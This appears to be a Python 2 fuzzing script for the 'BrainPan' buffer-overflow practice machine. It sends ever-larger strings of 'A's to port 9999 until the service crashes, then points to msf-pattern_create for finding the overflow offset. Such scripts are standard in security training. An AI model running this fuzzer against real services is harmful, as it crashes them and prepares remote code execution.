#!/usr/bin/python
import socket
import time
import sys
from struct import *

rhost = 'x.x.x.x' #! Insert BrainPan IP Address.
rport = 9999 #! If need, change port.
size = 100
buffer = 'A' * size


while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((rhost,rport))
    except:
        print "--------------------------------------"
        print "Run msf-pattern_create -l " + str(size - 100)
        print "--------------------------------------"
        sys.exit(1)
    print "Buffer size: " + str(size)
    s.send('' + buffer + '\r\n')
    time.sleep(1)
    size += 100
    s.close()
    buffer = "A" * size

